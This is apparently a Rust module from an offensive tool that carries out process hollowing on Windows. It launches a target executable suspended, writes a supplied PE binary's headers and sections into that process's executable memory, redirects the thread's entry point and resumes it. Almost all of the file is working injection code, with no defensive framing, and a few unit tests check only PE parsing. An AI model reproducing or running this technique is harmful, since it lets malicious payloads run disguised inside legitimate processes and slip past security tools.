use anyhow::{anyhow, Context, Result};
use std::mem;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, WriteProcessMemory,
    CONTEXT, CONTEXT_FLAGS, GetThreadContext, SetThreadContext,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
use windows::Win32::System::Threading::{
    CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED,
};

/// Execute PE binary using Process Hollowing technique
/// Note: Currently only supports 64-bit PE binaries
pub fn inject_and_execute(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<()> {
    if verbose {
        println!("Starting Process Hollowing...");
    }

    validate_pe(pe_data, verbose)?;
    let is_64bit = is_pe64(pe_data)?;

    if verbose {
        println!(
            "Architecture: {}",
            if is_64bit { "64-bit" } else { "32-bit" }
        );
    }

    if !is_64bit {
        return Err(anyhow!("Process Hollowing currently only supports 64-bit PE binaries"));
    }

        hollow_process64(pe_data, target_path, verbose)

}

fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<()> {
    if verbose {
        println!("Creating suspended target process: {}", target_path);
    }

    // Create target process in suspended state
    let process_info = create_suspended_process(target_path)?;

    if verbose {
        println!("Process created with PID: {}", process_info.dwProcessId);
    }

    // Get NT headers
    let nt_header = get_nt_headers64(pe_data)?;
    
    let image_base = unsafe { (*nt_header).OptionalHeader.ImageBase };
    let image_size = unsafe { (*nt_header).OptionalHeader.SizeOfImage };
    let entry_point = unsafe { (*nt_header).OptionalHeader.AddressOfEntryPoint };

    if verbose {
        println!("Image base: 0x{:X}", image_base);
        println!("Image size: 0x{:X}", image_size);
        println!("Entry point: 0x{:X}", entry_point);
    }

    // Allocate memory in target process
    let remote_base = unsafe {
        VirtualAllocEx(
            process_info.hProcess,
            Some(image_base as *const std::ffi::c_void),
            image_size as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_base.is_null() {
        unsafe {
            CloseHandle(process_info.hProcess)?;
            CloseHandle(process_info.hThread)?;
        }
        return Err(anyhow!("Failed to allocate memory in target process"));
    }

    if verbose {
        println!("Allocated memory at: 0x{:X}", remote_base as u64);
    }

    // Write PE headers
    write_pe_to_process(process_info.hProcess, remote_base, pe_data, nt_header, verbose)?;

    // Get thread context to update entry point
    let mut context: CONTEXT = unsafe { mem::zeroed() };
    context.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL

    unsafe {
        GetThreadContext(process_info.hThread, &mut context)
            .map_err(|e| {
                let _ = CloseHandle(process_info.hProcess);
                let _ = CloseHandle(process_info.hThread);
                anyhow::anyhow!("Failed to get thread context: {:?}", e)
            })?;
    }

    // Update entry point register based on architecture
    #[cfg(target_arch = "x86_64")]
    {
        context.Rcx = (remote_base as u64) + entry_point as u64;
        if verbose {
            println!("Setting entry point to: 0x{:X}", context.Rcx);
        }
    }
    
    #[cfg(target_arch = "x86")]
    {
        context.Eip = (remote_base as u32) + entry_point as u32;
        if verbose {
            println!("Setting entry point to: 0x{:X}", context.Eip);
        }
    }

    unsafe {
        SetThreadContext(process_info.hThread, &context)
            .map_err(|e| {
                let _ = CloseHandle(process_info.hProcess);
                let _ = CloseHandle(process_info.hThread);
                anyhow::anyhow!("Failed to set thread context: {:?}", e)
            })?;
    }

    // Resume main thread
    if verbose {
        println!("Resuming main thread...");
    }

    unsafe {
        let resume_result = ResumeThread(process_info.hThread);
        if resume_result == u32::MAX {
            CloseHandle(process_info.hProcess)?;
            CloseHandle(process_info.hThread)?;
            return Err(anyhow!("Failed to resume thread"));
        }
        CloseHandle(process_info.hProcess)?;
        CloseHandle(process_info.hThread)?;
    }

    if verbose {
        println!("Process hollowing completed successfully");
    }

    Ok(())
}


fn create_suspended_process(target_path: &str) -> Result<PROCESS_INFORMATION> {
    let mut startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;

    let mut process_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let target_path_cstring = std::ffi::CString::new(target_path)
        .map_err(|_| anyhow!("Invalid target path"))?;

    unsafe {
        CreateProcessA(
            PCSTR::null(),
            windows::core::PSTR(target_path_cstring.as_ptr() as *mut u8),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &startup_info,
            &mut process_info,
        )?;
    }

    Ok(process_info)
}

fn write_pe_to_process(
    process_handle: HANDLE,
    remote_base: *mut std::ffi::c_void,
    pe_data: &[u8],
    nt_header: *const IMAGE_NT_HEADERS64,
    verbose: bool,
) -> Result<()> {
    // Write PE headers
    let headers_size = unsafe { (*nt_header).OptionalHeader.SizeOfHeaders };
    
    if verbose {
        println!("Writing PE headers ({} bytes)...", headers_size);
    }

    unsafe {
        WriteProcessMemory(
            process_handle,
            remote_base,
            pe_data.as_ptr() as *const std::ffi::c_void,
            headers_size as usize,
            None,
        )
        .context("Failed to write PE headers to target process")?;
    }

    // Write sections
    let section_header_ptr = (nt_header as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    let number_of_sections = unsafe { (*nt_header).FileHeader.NumberOfSections };

    for i in 0..number_of_sections {
        let section = unsafe { &*section_header_ptr.add(i as usize) };
        
        if section.SizeOfRawData == 0 {
            continue;
        }

        let section_name = std::str::from_utf8(&section.Name)
            .map_err(|_| anyhow!("Invalid UTF-8 in section name"))?
            .trim_end_matches('\0');

        if verbose {
            println!(
                "Writing section: {} (VirtualAddress: 0x{:X}, Size: 0x{:X})",
                section_name,
                section.VirtualAddress,
                section.SizeOfRawData
            );
        }

        let dest = (remote_base as usize + section.VirtualAddress as usize) as *mut std::ffi::c_void;

        let src = unsafe {
            pe_data.as_ptr().add(section.PointerToRawData as usize) as *const std::ffi::c_void
        };

        unsafe {
            WriteProcessMemory(
                process_handle,
                dest,
                src,
                section.SizeOfRawData as usize,
                None,
            )
            .with_context(|| format!("Failed to write section {} to target process", section_name))?;
        }
    }

    Ok(())
}

fn validate_pe(data: &[u8], verbose: bool) -> Result<()> {
    if data.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err(anyhow!("File too small to be a valid PE"));
    }

    let dos_header = unsafe { &*(data.as_ptr() as *const IMAGE_DOS_HEADER) };

    if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
        return Err(anyhow!("Invalid DOS signature"));
    }

    let pe_offset = dos_header.e_lfanew as usize;
    if pe_offset + 4 > data.len() {
        return Err(anyhow!("Invalid PE offset"));
    }

    let signature = unsafe { *(data.as_ptr().add(pe_offset) as *const u32) };
    if signature != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("Invalid PE signature"));
    }

    if verbose {
        println!("PE validation passed");
    }

    Ok(())
}

fn is_pe64(data: &[u8]) -> Result<bool> {
    let dos_header = unsafe { &*(data.as_ptr() as *const IMAGE_DOS_HEADER) };
    let pe_offset = dos_header.e_lfanew as usize;
    
    let machine_offset = pe_offset + 4 + mem::offset_of!(windows::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER, Machine);
    
    if machine_offset + 2 > data.len() {
        return Err(anyhow!("Invalid PE file"));
    }

    let machine = unsafe { *(data.as_ptr().add(machine_offset) as *const u16) };
    
    Ok(machine == 0x8664) // IMAGE_FILE_MACHINE_AMD64
}

fn get_nt_headers64(data: &[u8]) -> Result<*const IMAGE_NT_HEADERS64> {
    let dos_header = unsafe { &*(data.as_ptr() as *const IMAGE_DOS_HEADER) };
    let pe_offset = dos_header.e_lfanew as usize;
    
    if pe_offset + mem::size_of::<IMAGE_NT_HEADERS64>() > data.len() {
        return Err(anyhow!("Invalid PE file"));
    }

    Ok(unsafe { data.as_ptr().add(pe_offset) as *const IMAGE_NT_HEADERS64 })
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_pe_valid() {
        let mut pe_data = vec![0u8; 512];
        pe_data[0] = b'M';
        pe_data[1] = b'Z';
        pe_data[60] = 128;
        pe_data[128] = b'P';
        pe_data[129] = b'E';

        assert!(validate_pe(&pe_data, false).is_ok());
    }

    #[test]
    fn test_validate_pe_invalid() {
        let invalid_data = vec![0u8; 64];
        assert!(validate_pe(&invalid_data, false).is_err());
    }

    #[test]
    fn test_validate_pe_invalid_signature() {
        let mut pe_data = vec![0u8; 256];
        pe_data[0] = b'X';
        pe_data[1] = b'Y';

        assert!(validate_pe(&pe_data, false).is_err());
    }
}

